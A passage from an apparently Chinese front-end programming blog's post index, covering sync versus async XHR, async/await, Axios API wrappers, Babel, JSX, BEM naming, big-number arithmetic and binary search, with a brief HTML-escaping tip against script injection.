都變成「同步」的，所以就得到了滿滿的「block（堵塞）」，也體會到了 you can’t do anything, because it’s stuck. 這句話的內涵。 原始碼： （有興趣的人可以直接貼到 console 去跑跑看） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 測試用的按鈕const button = document.querySelector('button')// 加上 click 事件，如果發生 block 就點不了button.addEventListener('click', () =&gt; console.log('click'))/* 以下是發 request 的流程 total: 總共要發幾次 request counter: 紀錄發了幾次 request 當 counter &lt; total 就會繼續發出 request*/let total = 1000let counter = 1function handler () { // counter + 1（更新） counter++ // 檢查回傳資料 if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { const { prize, error=null } = JSON.parse(request.responseText) if (error) { console.log(error) } switch (prize) { case 'NONE': console.log(prize) break case 'FIRST': console.log(prize) break case 'SECOND': console.log(prize) break case 'THIRD': console.log(prize) break } } else { // 發生未預期的錯誤 console.log('500') } // 沒抓夠，在 send 一次 request if (counter &lt;= total) { /* 問題就出在這裡 request.send() 的第三個參數 true: 非同步執行 false: 同步執行 */ request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', false ) // 因為是同步，所以會卡在這裡等 request.send() }}const request = new XMLHttpRequest()request.addEventListener('load', handler)request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', false)// 因為是同步，所以會卡在這裡等request.send()// 等上面全部執行完，才會跑這一段console.log('sync') 輸出： 可以注意到 click 跟 sync 會等到「所有的 request」結束後才被執行到。 當時為了找出原因，我還試著用 setTimeout 來模擬一段非同步操作。 原始碼： 123456789101112131415161718/* 以下會是每一次的 callback (handler) 去呼叫下一個 setTimeout 並且把目前的數字顯示到 DOM 元素上 會從 1 跑到 1000 為止*/let total = 1000let counter = 1function handler () { // 更新 DOM 元素內容 div.innerText = counter++ // 還沒 1000 次就在呼叫一次 setTimeout if (counter &lt;= total) { setTimeout(handler, 100) }}// 第一次執行 setTimeoutsetTimeout(handler, 100) 輸出： 這下我更亂了，明明兩個的邏輯是一樣的卻有不同的行為？ 後來我試著用 debugger 來看到底哪裡出了問題，但還是沒找出來。直到最後在 starkoverflow 的 XMLHttpRequest in for loop 才發現： 靠北，原來是我寫錯參數。 所以把只要把參數改掉，一切就正常了： 原始碼： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 測試用的按鈕const button = document.querySelector('button')// 加上 click 事件，如果發生 block 就點不了button.addEventListener('click', () =&gt; console.log('click'))/* 以下是發 request 的流程 total: 總共要發幾次 request counter: 紀錄發了幾次 request 當 counter &lt; total 就會繼續發出 request*/let total = 1000let counter = 1function handler () { // counter + 1（更新） counter++ // 檢查回傳資料 if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { const { prize, error=null } = JSON.parse(request.responseText) if (error) { console.log(error) } switch (prize) { case 'NONE': console.log(prize) break case 'FIRST': console.log(prize) break case 'SECOND': console.log(prize) break case 'THIRD': console.log(prize) break } } else { // 發生未預期的錯誤 console.log('500') } // 沒抓夠，在 send 一次 request if (counter &lt;= total) { /* 問題就出在這裡 request.send() 的第三個參數 true: 非同步執行 false: 同步執行 */ request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', true ) // 非同步執行，會接著跑下面的程式碼 request.send() }}const request = new XMLHttpRequest()request.addEventListener('load', handler)/* 問題就出在這裡 request.send() 的第三個參數 true: 非同步執行 false: 同步執行*/request.open( 'GET', 'https://dvwhnbka7d.execute-api.us-east-1.amazonaws.com/default/lottery', true)// 非同步執行，會接著跑下面的程式碼request.send()// 上面被 call 完後馬上跑這一段console.log('sync') 輸出： 現在一開始 sync 就會被執行，而且 click 也能正常執行，不會有像剛剛「block」的情況發生。 後記雖然搞了場烏龍，但我們可以從中學到一點東西，因此我花了些時間來分析這兩者實際上的執行流程。 在同步的情況時： 簡單來說，用來處理 response 的 handler 都會去執行下一個 request：request.send() 所以第一個 request.send 會一直等一直等，等到最後的 request 被解決完，在「遞迴」到最一開始的原點。但是在那之前會先得到 Maximum call stack 的錯誤。（佔太多空間啦） 在非同步的情況時： 這裡最大的特點是，每當 Call stack 中執行到「非同步」時，就會像圖中那樣直接丟到「Web API」讓瀏覽器去處理，此時 Call stack 就「空出位置」能夠執行其他的程式碼。（這也是為什麼 sync 跟 click 可以正常執行） 另外每一次 handler 在執行下一個 request 的時候，因為是非同步，所以 request 會直接被丟到 Web API 處理，而 handler 就執行結束了，不會像同步的情況一直「堆疊」。","link":"/2022/01/26/asyn-and-sync-fool-mistake/"},{"title":"async await 背後的原理","text":"把以前的誤解給釐清。 簡述首先 async 和 await 是一個 ES7 推出的語法糖，讓你可以用很像同步的方式來寫處理非同步。範例可以參考我以前寫的文章：Promise 的小技巧 總之再強調一次，async 和 await 只是「看起來很像同步」，但背後一樣是非同步。 根據我在網路上找的資料是說，其實背後也是用 Promise 包裝起來，也因為這個原因 await 一定要放在 async function 裡才能運作。 所以我寫了一段對應的程式碼，可以比較一下差異。 async 的寫法 1234567891011121314151617181920// 包裝 xhrconst getData = (url) =&gt; { return new Promise(resolve =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); request.onload = () =&gt; { resolve(JSON.parse(request.responseText)) }; request.send(); })}// async / awaitconst sendAllRequestByAsync = async () =&gt; { const data1 = await getData(api200) console.log('1', data1); const data2 = await getData(api200) console.log('2', data2); const data3 = await getData(api200) console.log('3', data3);} Promise 的寫法 123456789101112131415161718192021222324252627282930// 包裝 xhrconst getData = (url) =&gt; { return new Promise(resolve =&gt; { const request = new XMLHttpRequest(); request.open('GET', api200, true); request.onload = () =&gt; { resolve(JSON.parse(request.responseText)) }; request.send(); })}// Promiseconst sendAllRequestByPromise = () =&gt; { getData(api200) .then(data =&gt; { const data1 = data console.log('1', data1) return getData(api200) }) .then(data =&gt; { const data2 = data console.log('2', data2) return getData(api200) }) .then(data =&gt; { const data3 = data console.log('3', data3) return getData(api200) })}","link":"/2022/03/03/async-and-await-principle/"},{"title":"利用 Axios 來封裝 API","text":"還蠻不錯的想法。 簡述以前因為我總認為 Axios 是個有點多餘的 library，因為不過就是把 fetch 包裝成 axios.get 或 axios.post 而已，那幹嘛不直接 fetch 就好了？ 但一直到最近才發現原來有 Axios 有提供 instance（實體）的功能來讓你方便管理 API。實際用過以後覺得還不錯，所以來做個紀錄。 前置作業等一下會提到幾個東西： axios.create() 用來建立 instance instance.interceptors 攔截器，用來處理發出 req 之前和拿到 res 之前要做的事 接著來邊看 code 邊解釋。 首先會先建立一個 axios 的實體： 附註：這邊用的測試 API 是這支。 1234567const instance = axios.create({ // 之後發 req 時就能寫相對路徑，例如： /users/1 baseURL: \"https://reqres.in/api/\", headers: { 'Content-Type': 'application/json' }, // 超過幾 ms 就算失敗 timeout: 20000}) 建立好以後它就跟一般的 axios 一樣，可以用 instance.get instance.post 之類的方法，不過在那之前我們會先設定「攔截器（interceptors）」。 攔截器就是讓你設定： request 發出去以前我想做什麼事？ response 拿到以後，把值回傳給其他 handler 以前要做什麼？ 所以 request 的部分會這樣設定： 12345678910111213// 第一個 function 會拿到 config// 第二個 function 會拿到 error（發生錯誤時）instance.interceptors.request.use( function (config) { // 可以在這裡修改 config // 這邊只是隨便示範，例如在這加上 Auth token header config.headers.Authorization = 'Bearer 12345'; return config; }, function (err) { return Promise.reject(err); }) 而 response 的部分通常會著重在錯誤處理： 12345678910111213141516171819202122232425262728instance.interceptors.response.use( // 成功的處理 function (res) { // 如果想做些事情可以在這裡做 return res; }, // 失敗的處理 function (err) { if (err.response) { switch (err.response.status) { case 404: console.log('不存在'); // 導向 404 頁面 break case 500: console.log('伺服器錯誤'); break default: console.log(err.message); } } if (!window.navigator.onLine) { alert(\"你網路有問題哦！\") return } return Promise.reject(err) }) 封裝雖然上面做好後就可以直接用了，不過更好的方式是把他做封裝起來，讓我們在用的時候更直覺，像這樣： 12345// 取得的第一頁的 user 列表gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) 經過包裝後就能很快知道我們要用哪隻 API，跟要帶的資料、參數是什麼。 不然原本的話得這樣寫： 123instance.get('/users/1') .then(res =&gt; console.log(res)) .catch(err =&gt; console.log('err', err)) 所以第一步是先把 method 用 function 來包裝起來，讓它可以透過參數來決定要做什麼事： 12345678910111213141516171819// parms 是 query string，例如：https://example[?gender=female&amp;age=20]export function api (method, url, data = null, config) { method = method.toLowerCase(); switch (method) { case \"post\": return instance.post(url, data, config) case \"get\": return instance.get(url, { params: data }) case \"delete\": return instance.delete(url, { params: data }) case \"put\": return instance.put(url, data) case \"patch\": return instance.patch(url, data) default: console.log('unknown method type'); return false; }} 附註－關於 axios 的參數值我原本不太懂上面的參數值為什麼可以那樣設，所以這邊才留個補充。如果你本來就看得懂的話請無視這一段。 來舉個例子，假設我想發一個 POST 請求，那我有兩種寫法。 第一種是用 post() 方法 + url + data + config： 123456789axios.post(\"https://example.com/api/users\", { name: \"PeaNu\", age: 20, des: \"...\"}, { params: { token: \"123456\" }}) 第二種是全部塞在 config： 123456789101112axios({ method: \"post\", url: 'https://aaa.com/api/users', data: { name: 'PeaNU', age: 20, des: \"...\" }, params: { token: \"12345\" }}) 總之這兩個東西會是一樣的，只是寫法不同而已。 而上面用的 instance.post 正是第一種寫法，所以才要傳給他 url + data + config 這三個參數。 最後再補充一件事，就是 get() 跟 delete() 因為不需要傳資料，所以只會有 url 跟 config 這兩個參數，所以上面才會寫成 instance.delete(url, { params: data }) 的形式。 如果怕忘記的話可以參考 vs code 的 TypeScript 提示 OK，解說就到這邊為止。 接著新增一個檔案，讓跟剛剛 export 出來的 function 在做一層包裝： 1234567891011121314151617181920212223// user.jsimport { api } from \"./api\";const URL = \"/users\";export const gerUserList = (data) =&gt; { return api(\"GET\", URL, data);}export const addUser = (data) =&gt; { return api(\"POST\", URL, data);}export const putUser = (userId, data) =&gt; { return api(\"PUT\", `${URL}/${userId}`, data);}export const patchUser = (userId, data) =&gt; { return api(\"PATCH\", `${URL}/${userId}`, data);}export const deleteUser = (userId) =&gt; { return api(\"DELETE\", `${URL}/${userId}`);} 或你要用 OOP 的方式包裝成 class 也可以： 12345678910111213141516171819202122232425import { api } from \"./api\";const URL = \"/users\";export class UserApi { gerUserList = async (data) =&gt; { return api(\"GET\", URL, data); } addUser = async (data) =&gt; { return api(\"POST\", URL, data); } putUser = async (userId, data) =&gt; { return api(\"PUT\", `${URL}/${userId}`, data); } patchUser = async (userId, data) =&gt; { return api(\"PATCH\", `${URL}/${userId}`, data); } deleteUser = async (userId) =&gt; { return api(\"DELETE\", `${URL}/${userId}`); }} 最後呢，就可以把我們寫好的東西拿來用了： 1234567import { gerUserList } from \"./user\";gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) class 的寫法： 1234567import { UserApi } from \"./userByClass\";const api = new UserApi();api.gerUserList({ page: 1}).then(res =&gt; console.log('Get user list', res.data)) .catch(err =&gt; console.log('err', err)) 以上，有任何問題的話都可以到這邊參考原始碼。 參考資料 用 Axios Instance 管理 API","link":"/2022/05/12/axios-instance/"},{"title":"babel-node 初體驗","text":"簡單玩一下。 什麼是 babel-node簡單來說就是一個跟 node 很像的指令，用 babel-node 來執行時會先幫你「編譯」成舊的語法在執行，所以你可以用 babel-node 來跑一下 ES6 或新的語法。 但要提醒一下，這個只適合用在 development，如果用在 production 的話效能會不好。 更多詳細可以參考 官網 所以如果你只是想稍微玩一下新語法，但又覺得要先把檔案編譯成 bundle.js 太麻煩的話，可以用這個套件來玩一下。 該安裝的東西與設定安裝以下這些套件： 12npm install --save-dev @babel/core @babel/nodenpm install --save-dev @babel/preset-env 簡單解釋一下 @babel/core 是 babel 的主要內容，大部分的 babel 套件都需要依賴它來執行。@babel/node 就是這次要使用的套件。 至於 @babel/preset-env 是用來對 babel 做 preset 設定的套件，用來跟 babel 說「請你幫我把 xxx 語法轉成 xxx 語法」，大概是這樣的意思。 最後要記得建立 .babelrc 檔案來告訴 babel 你要用 @babel/preset-env 這個套件： 123{ \"presets\": [\"@babel/preset-env\"]} 簡單示範假設我現在用 ES6 的 import 跟 export 的語法來寫模組： 1234// utils.jsexport function add(a, b) { return a + b} 123// main.jsimport { add } from './utils.js'console.log(add(1, 2)) 如果我直接用 node main.js 的話： 123456789101112131415161718user@LAPTOP-3A1RJ558 MINGW64 /d/test_folder$ node main.js(node:20824) Warning: To load an ES module, set \"type\": \"module\" in the package.jsonor use the .mjs extension.(Use `node --trace-warnings ...` to show where the warning was created)D:\\test_folder\\main.js:10import { add } from './utils.js'^^^^^^SyntaxError: Cannot use import statement outside a module at wrapSafe (internal/modules/cjs/loader.js:984:16) at Module._compile (internal/modules/cjs/loader.js:1032:27) at Object.Module._extensions..js (internal/modules/cjs/loader.js:1097:10) at Module.load (internal/modules/cjs/loader.js:933:32) at Function.Module._load (internal/modules/cjs/loader.js:774:14) at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:72:12) at internal/main/run_main_module.js:17:47 （現在 Node.js 有提供內建的方式來執行 import 與 export，所以錯誤訊息有跟你說該做什麼設定） 簡單來說就是不支援這個語法，所以沒辦法跑。 現在改用 npx babel-node main.js： 13 // 執行成功 這樣就可以安心寫 ES6 囉。","link":"/2021/12/25/babel-node/"},{"title":"babel 之再次複習","text":"再複習一次。 簡述先安裝 3 個東西： @babel/core @babel/cli @babel/preset-env 裝完後 package.json 應該要長這樣： 12345\"devDependencies\": { \"@babel/cli\": \"^7.17.6\", \"@babel/core\": \"^7.17.5\", \"@babel/preset-env\": \"^7.16.11\",} 接著在根目錄建立 .babel.config.json，用來設定 preset 的資訊： 123{ \"presets\": [\"@babel/preset-env\"]} 這支檔案裡面可以寫一些設定，例如說要支援 0.25% 人在使用的瀏覽器就會這樣寫： 12345678910{ \"presets\": [ [ \"@babel/preset-env\", { \"useBuiltIns\": \"entry\" } ] ]} 通常預設的設定就很夠用了，所以沒特殊需求的話不用改。 實際使用接著來寫一些 ES6 的東西，看用 babel 轉完後會變怎樣： 1234567const a = 1;const b = [1, 2, 3, 4];const c = [...b];for (let n of c) { console.log(n);} 接著執行 babel： 1234# 透過 package.json 執行 babel src -d libnpm run build# 透過 npxnpx babel src -d lib 輸出結果： 12345678910111213141516171819202122232425\"use strict\";function _createForOfIteratorHelper(o, allowArrayLike) { var it = typeof Symbol !== \"undefined\" &amp;&amp; o[Symbol.iterator] || o[\"@@iterator\"]; if (!it) { if (Array.isArray(o) || (it = _unsupportedIterableToArray(o)) || allowArrayLike &amp;&amp; o &amp;&amp; typeof o.length === \"number\") { if (it) o = it; var i = 0; var F = function F() {}; return { s: F, n: function n() { if (i &gt;= o.length) return { done: true }; return { done: false, value: o[i++] }; }, e: function e(_e) { throw _e; }, f: F }; } throw new TypeError(\"Invalid attempt to iterate non-iterable instance.\\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.\"); } var normalCompletion = true, didErr = false, err; return { s: function s() { it = it.call(o); }, n: function n() { var step = it.next(); normalCompletion = step.done; return step; }, e: function e(_e2) { didErr = true; err = _e2; }, f: function f() { try { if (!normalCompletion &amp;&amp; it[\"return\"] != null) it[\"return\"](); } finally { if (didErr) throw err; } } }; }function _unsupportedIterableToArray(o, minLen) { if (!o) return; if (typeof o === \"string\") return _arrayLikeToArray(o, minLen); var n = Object.prototype.toString.call(o).slice(8, -1); if (n === \"Object\" &amp;&amp; o.constructor) n = o.constructor.name; if (n === \"Map\" || n === \"Set\") return Array.from(o); if (n === \"Arguments\" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen); }function _arrayLikeToArray(arr, len) { if (len == null || len &gt; arr.length) len = arr.length; for (var i = 0, arr2 = new Array(len); i &lt; len; i++) { arr2[i] = arr[i]; } return arr2; }var a = 1;var b = [1, 2, 3, 4];var c = [].concat(b);var _iterator = _createForOfIteratorHelper(c), _step;try { for (_iterator.s(); !(_step = _iterator.n()).done;) { var n = _step.value; console.log(n); }} catch (err) { _iterator.e(err);} finally { _iterator.f();} 看起來亂七八糟的，但不要緊！這是 babel 為了支援舊的瀏覽器而加上的程式碼。 總之呢，只要引入這支檔案就能支援舊的瀏覽器囉！","link":"/2022/02/28/babel-usage/"},{"title":"JSX 的原理","text":"原來如此。 簡述 就只是 babel 而已 對，其實 JSX 背後只是透過 babel 來做轉譯而已： 1&lt;Button name=\"cool\" onClick={() =&gt; console.log('yo')}&gt;yo&lt;/Button&gt; 123456React.createElement(Button, { name: \"cool\", onClick: function onClick() { return console.log('yo'); }}, \"yo\"); 兩個東西是等價的，所以 JSX 不是什麼黑魔法，真的就只是 Babel 而已！","link":"/2022/04/05/behide-jsx/"},{"title":"BEM隨筆記","text":"紀錄一些 BEM 在使用時可能會碰到的問題。 對 Modifier 下的 Element 定義新的規則假使我們有一個卡片組件如下： 123456&lt;article class=\"card\"&gt; &lt;h2 class=\"card__title\"&gt;...&lt;/h2&gt; &lt;p class=\"card__text\"&gt;...&lt;/p&gt; &lt;p class=\"card__text card__text--secondary\"&gt;...&lt;/p&gt; &lt;a class=\"card__button\" href=\"#\"&gt;...&lt;/a&gt;&lt;/article&gt; 現在我們想要定義一個新的 Modiefier， card--feature，會長這樣子。 除了 card--feature 的背景顏色會改變之外， 其下的 card__title, card__text, card__button 也都要做修改，這種時候該怎麼寫才好？ 有些人會這樣子寫： 1234567891011121314151617181920212223242526272829.card { // ... &amp;__title { // ... } &amp;__text { // ... } &amp;__button { // ... } /* --feature 跟 .card 都是指到同個元素 所以下面的 Element 都是同樣的： (.card &gt; card__title) === (.card--feature &gt; card--feature__title) */ &amp;--feature { // ... .card__title { // ... } .card__text { // ... } .card__button { // ... } }} 但如果今天要改 class 名稱的時候，要修改的地方就會變很多。 所以建議你可以這樣子寫： 1234567891011121314151617181920212223242526272829.card { // ... &amp;__title { // ... } &amp;__text { // ... } &amp;__button { // ... } /* --feature 跟 .card 都是指到同個元素 所以下面的 Element 都是同樣的： (.card &gt; card__title) === (.card--feature &gt; card--feature__title) */ &amp;--feature { // ... } &amp;--feature &amp;__title { // ... } &amp;--feature &amp;__text { // ... } &amp;--feature &amp;__button { // ... }} 這樣子要改 class 名稱時，只要改最外層那個 card 就解決囉。 🚀 Codepen：點這裡 什麼時候不該寫成 BEM當有一個 class 是可以獨立存在的時候 例如： 123.clearfix { clear: both;} 雖然按照 BEM 的規則，你可以把它歸類成Modifier。但它其實是一個可以獨自存在的 class，而且可以用在網頁的各種地方。所以比起寫成modifier，把它歸類為一個單獨存在的 class，或許會更適合。 適合模組化的時機假設你的 HTML 結構長這樣： 1234567&lt;div class=\"content\"&gt; &lt;ul class=\"menu\"&gt; &lt;li class=\"item\"&gt;menu1&lt;/li&gt; &lt;li class=\"item\"&gt;menu2&lt;/li&gt; &lt;li class=\"item\"&gt;menu3&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 你可能會很直覺的寫成content__menu這種結構。但是如果你這樣子寫，意思就會是，menu 跟 content 區塊綁在一起。 那如果網頁中有其他的地方也會有選單的話呢？你就沒辦法直接拿menu這個模組來用了，因為它跟content綁在一起了。 所以我們透過 BEM 來建立每個模組的時候要思考一件事：「這個區塊有沒有可能會在網頁的其他地方出現」 所以回到上面的例子。比起讓menu作為content下的Element，menu更適合當作是一個Block，這樣子menu會成為一個模組，也就有更高的靈活性。 一個 Block 下最多只會連接一個 Element這裡引用來自BEM by Example的一段敘述： If your component has child elements several levels deep, don’t try to represent each level in the class name. BEM is not intended to communicate structural depth. A BEM class name representing a child element in the component should only include the base/block name and the one element name. 意思是說，假使一個 component 下有多個層級的子元素，我們也不必在 BEM 把每一層的結構寫出來，譬如說： 123456789&lt;figure class=\"photo\"&gt; &lt;img class=\"photo__img\" src=\"image.jpg\" /&gt; &lt;figcaption class=\"photo__caption\"&gt; 圖片解說 &lt;blockquote class=\"photo__caption__quote\"&gt; 不要在一個class裡面放一個以上的element &lt;/blockquote&gt; &lt;/figcaption&gt;&lt;/figure&gt; 所以一個Block下最多只會寫一層Element： 1234567&lt;figure class=\"photo\"&gt; &lt;img class=\"photo__img\" src=\"image.jpg\" /&gt; &lt;figcaption class=\"photo__caption\"&gt; 圖片解說 &lt;blockquote class=\"photo__quote\"&gt;這樣就對了&lt;/blockquote&gt; &lt;/figcaption&gt;&lt;/figure&gt; 即便你沒有把每一個層級都寫出來，也能夠看出img, caption, quote都是photo這個 component 下的元素。 所以只要掌握住一個原則：這個元素是哪個 component 下的元素，就能寫出簡潔清楚的 class 名稱。 有些元素不需要綁在 Block 上拿我在Frontend Mentor挑戰中的header部分來舉例： 1234&lt;header class=\"header\"&gt; &lt;h3 class=\"slogan\"&gt;WE ARE CREATIVES&lt;/h3&gt; &lt;a class=\"arrow\"&gt;&lt;img class=\"pic\" src=\"arrow.jpg\" /&gt;&lt;/a&gt;&lt;/header&gt; slogan跟arrow這兩個元素其實都能獨自存在，並沒有一定要綁在header這個Block上（除非你把整個header當成是一個 component），所以就不建議這樣子寫： 1234&lt;header class=\"header\"&gt; &lt;h3 class=\"header__slogan\"&gt;WE ARE CREATIVES&lt;/h3&gt; &lt;a class=\"header__arrow\"&gt;&lt;img class=\"header__pic\" src=\"arrow.jpg\" /&gt;&lt;/a&gt;&lt;/header&gt; 這種情況大多會發生在文字的部分，所以這種時候就建議寫一個方便識別的 class 就好，不用一定要照著 BEM 的規則來命名。 參考資料BEM by Example竹白記事本-BEM，CSS 設計模式IT 人-[譯] CSS 使用 BEM 命名規範的五大理由","link":"/2021/07/28/bem-note/"},{"title":"善用跳脫字元，避免不合法的輸入內容","text":"資安呀～ 簡述在做 Todo list 的時候就有預先想到可能會有這種情況： 如果你沒有做任何防範，使用者就能直接把 &lt;script&gt; 塞到你的網頁做壞事。 比較安全的作法所以可以寫一個 function 專門跳脫這些危險字元： 123456789/* 把 &lt; &gt; @ ' \" 都做字元跳脫 */function escapeHTML(unsafe) { return unsafe .replace(/&amp;/g, '&amp;amp;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/'/g, '&amp;#039;') .replace(/\"/g, '&amp;quot;')} 備註：建議不要亂改這個順序，否則輸出結果可能跟你想的不一樣。 這樣子就能做到「最基本」的資訊安全，特別強調「基本」是因為厲害的人還是有辦法繞道而行。","link":"/2022/01/24/beware-the-unsafe-input/"},{"title":"大數相加與相乘","text":"蠻有挑戰性的一題 簡述這題是來自程式導師計畫 week2 的超級超級挑戰題。 解題的邏輯能用「直式算數」來思考，也就是把大問題拆成小問題的一種思考模式。 大數相加建議先把大數相加弄懂再去解相乘會比較好理解，因為在做相乘時也需要用到相加的概念： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function add(a, b){ let result = ''; // 有沒有進位（flag） let hasCarryBit = false; // 看誰比較長 const lengthA = a.length; const lengthB = b.length; let totalDigits = undefined; // 比較短的數字要補 0 if (lengthA &gt; lengthB) { totalDigits = lengthA; for (let i=0; i&lt;lengthA - lengthB; i++) { b = '0' + b; } } else if (lengthA &lt; lengthB) { totalDigits = lengthB; for (let i=0; i&lt;lengthB - lengthA; i++) { a = '0' + a; } } else { totalDigits = lengthA; } // 把每一位數相加 for (let i=totalDigits-1; i&gt;=0; i--) { let value = Number(a[i]) + Number(b[i]); // 上一位有進位就加 1 if (hasCarryBit) { value += 1; hasCarryBit = false; } // &gt;= 10 更新 flag if (value &gt;= 10) { hasCarryBit = true; } /* 取出最後一位數 19 =&gt; 9 + '' =&gt; '9' 5 =&gt; 5 + '' =&gt; '69' 13 =&gt; 3 + '' =&gt; '369' ... */ result = value%10 + result; // 剩一個數字 but 有進位數要再補 1（因為不跑下一圈） if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result; } } // 答案 return result;}const TESTNUMBER = '124902814902890825902840917490127902791247902479027210970941724092174091274902749012740921759037590347438758957283947234273942304239403274093275902375902374092410937290371093719023729103790123';const ANSWER = BigInt(add(TESTNUMBER, TESTNUMBER));const BIGINT = BigInt(TESTNUMBER) + BigInt(TESTNUMBER);console.log(ANSWER === BIGINT); // true 解釋一下為什麼一定要加這段： 1234// 剩一個數字 but 有進位數要再補 1（因為不跑下一圈）if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result;} 假設數字是 95 + 40，算到 9 + 4 = 13 的時候，前面的 1 理應要在下圈加上去，但要注意迴圈只會跑到數字長度，所以如果沒有加上這段答案會是 35 不是 135。 所以該怎麼辦？沒有怎麼辦，既然迴圈不會跑下一圈，那你只能在最後一圈的時候判斷有沒有進位數，有的話就要自己補 1 到前面，這就是為什麼這段很重要。 大數相乘相乘的邏輯大致上跟相加差不多，但有幾點要注意： 每一層要根據位數在尾巴補上 0（就跟做加法的時候一樣） 進位值要用除以 10 的方式來算（範圍變成 0 ~ 9） 要用累加器來紀錄上一次的值（算直式的時候要一層一層加總，所以得紀錄上一層的值） 這邊我都寫註解了，仔細看的話應該可以理解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119function multiply(a, b) { let result = ''; // 紀錄目前的位數 let currentDigit = 0; // 累加器 let accumulator = '0'; // 把 b 乘上 a 的每一位求出 sum for (let i=b.length-1; i&gt;=0; i--) { let sum = ''; // 進位的值 let carryBit = 0; // 有沒有進位（flag） let hasCarryBit = false; // a 的部分 for(let j=a.length-1; j&gt;=0; j--) { // b x a 的值 let value = Number(b[i]) * Number(a[j]); // 有進位就把數字加上去 if (hasCarryBit) { value += carryBit; carryBit = 0; hasCarryBit = false; } // 大於 10，算出進位值，更新 flag if (value &gt;= 10) { hasCarryBit = true; carryBit = Math.floor(value/10); } /* 5 + '' =&gt; '5' 9 + '5' =&gt; '95' 7 + '95' =&gt; '795' ... */ sum = value%10 + sum; // 剩一個數字 but 有進位數 if (j===0 &amp;&amp; hasCarryBit) { sum = carryBit + sum; } } /* 十位數補一個 0 百位數補兩個 0 ... */ for (let i=0; i&lt;currentDigit; i++) { sum = sum + '0'; } // 做大數相加（拿上面寫好的來用） result = add(sum, accumulator); // 加完後更新累加器 accumulator = result; // 更新目前是幾位數 currentDigit++; } // 答案 return result;}// 這段是前面寫好的 function 不用看function add(a, b){ let result = ''; // 有沒有進位（flag） let hasCarryBit = false; // 看誰比較長 const lengthA = a.length; const lengthB = b.length; let totalDigits = undefined; // 比較短的數字要補 0 if (lengthA &gt; lengthB) { totalDigits = lengthA; for (let i=0; i&lt;lengthA - lengthB; i++) { b = '0' + b; } } else if (lengthA &lt; lengthB) { totalDigits = lengthB; for (let i=0; i&lt;lengthB - lengthA; i++) { a = '0' + a; } } else { totalDigits = lengthA; } // 把每一位數相加 for (let i=totalDigits-1; i&gt;=0; i--) { let value = Number(a[i]) + Number(b[i]); // 上一位有進位就加 1 if (hasCarryBit) { value += 1; hasCarryBit = false; } // &gt;= 10 更新 flag if (value &gt;= 10) { hasCarryBit = true; } /* 取出最後一位數 19 =&gt; 9 + '' =&gt; '9' 5 =&gt; 5 + '' =&gt; '69' 13 =&gt; 3 + '' =&gt; '369' ... */ result = value%10 + result; // 剩一個數字 but 有進位數要再補 1（因為不跑下一圈） if (i===0 &amp;&amp; hasCarryBit) { result = '1' + result; } } // 答案 return result;}const TESTNUMBER = '124902814902890825902840917490127902791247902479027210970941724092174091274902749012740921759037590347438758957283947234273942304239403274093275902375902374092410937290371093719023729103790123';const ANSWER = BigInt(multiply(TESTNUMBER, TESTNUMBER));const BIGINT = BigInt(TESTNUMBER) * BigInt(TESTNUMBER);console.log(ANSWER === BIGINT); // true","link":"/2022/02/13/bigint-multiplication/"},{"title":"二分搜尋法（Binary-search）","text":"經典的搜尋法。 概念跟玩終極密碼的方法一樣，假設有 1 到 100 個按照順序排好的數字，在猜數字時，我們通常會這樣做： 一開始猜 50 =&gt; 如果數字比 50 大，接著猜 51 ~ 100 接著猜 75 =&gt; 如果數字比 75 大，接著猜 76 ~ 100 接著猜 87 =&gt; 如果數字比 87 大，接著猜 88 ~ 100 以此類推… 每次都把所有可能拆成兩半，就是二分搜尋法的核心理念。但要切記的一點是，這只適用於「已經排列好的數列」。 實作－遞迴法1234567891011121314151617181920212223242526272829303132333435363738// 要遞迴的 function function binarySearchRecursively(array, targetElement, start, end) { // 左邊界 &gt; 右邊界 if (start &gt; end) { return -1 } // 中間位置（無條件捨去，取偏左邊那點） const middle = (start + end) &gt;&gt; 1 /* 目標 = 中間那個數字： 找到數字了，直接回傳位置 目標 &gt; 中間的數字： 代表前面的數字不用看了，把 start 設為中間位置往右移一位（+1） 目標 &lt; 中間的數字： 代表後面的數字不用看了，把 end 設為中間位置往左移一位（-1） */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { // 更新 start 後，遞迴 binarySearchRecursively return binarySearchRecursively(array, targetElement, middle + 1, end) } else { // 更新 end 後，遞迴 binarySearchRecursively return binarySearchRecursively(array, targetElement, start, middle - 1) }}// 用來執行 binarySearchRecursivelyfunction binarySearch(array, targetElement) { return binarySearchRecursively(array, targetElement, 0, array.length-1)}const numbers = [1, 3, 24, 33, 57, 88, 99, 101]console.log(binarySearch(numbers, 25)) // -1console.log(binarySearch(numbers, 24)) // 2 詳細流程： 1234567891011121314151617181920212223第一輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33第二輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3第三輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24第四輪array: [1, 3, 24, 33, 57, 